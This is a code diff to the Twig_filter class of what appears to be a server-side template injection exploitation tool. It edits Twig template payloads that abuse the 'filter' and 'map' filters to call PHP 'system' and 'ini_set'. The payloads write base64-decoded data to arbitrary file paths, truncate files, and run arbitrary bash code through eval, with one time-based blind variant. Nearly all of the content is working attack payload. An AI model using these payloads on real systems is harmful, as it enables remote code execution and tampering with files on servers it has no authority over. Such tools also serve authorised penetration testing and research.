@@ -12,7 +12,7 @@ class Twig_filter(php.Php):
             'render': {
                 'render': '{code}',
                 # Disable errors, so that "system" will not corrupt the output with a warning
-                'header': '{{% for a in ["error_reporting", "0"]|sort("ini_set") %}}{{% endfor %}}{{{{{header}}}}}',
+                'header': '{{% for a in {{"0":"error_reporting"}}|map("ini_set") %}}{{% endfor %}}{{{{{header}}}}}',
                 'trailer': '{{{{{trailer}}}}}',
                 # {{7*'7'}} and a{#b#}c work in freemarker as well
                 # {%% set a=%i*%i %%}{{a}} works in Nunjucks as well
@@ -21,7 +21,7 @@ class Twig_filter(php.Php):
             },
             'write': {
                 'call': 'inject',
-                'write': """{{{{ ["bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,--decode}}>>{path}'"]|filter("system") }}}}""",
+                'write': """{{{{ ["bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}'"]|filter("system") }}}}""",
                 'truncate': """{{{{ ["echo -n >{path}"]|filter("system") }}}}"""
             },
             # Hackish way to evaluate PHP code
@@ -33,13 +33,13 @@ class Twig_filter(php.Php):
             },
             'execute': {
                 'call': 'render',
-                'execute': """{{% set foo=[] %}}{{% for a in ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,--decode}})}}'"]|filter("system") %}}{{% endfor %}}""",
+                'execute': """{{% set foo=[] %}}{{% for a in ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'"]|filter("system") %}}{{% endfor %}}""",
                 'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                 'test_cmd_expected': rand.randstrings[2]
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """{{{{ ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,--decode}})}}&&{{sleep,{delay}}}'"]|filter("system") }}}}"""
+                'execute_blind': """{{{{ ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}'"]|filter("system") }}}}"""
             },
             'evaluate_blind': {
                 'call': 'execute',
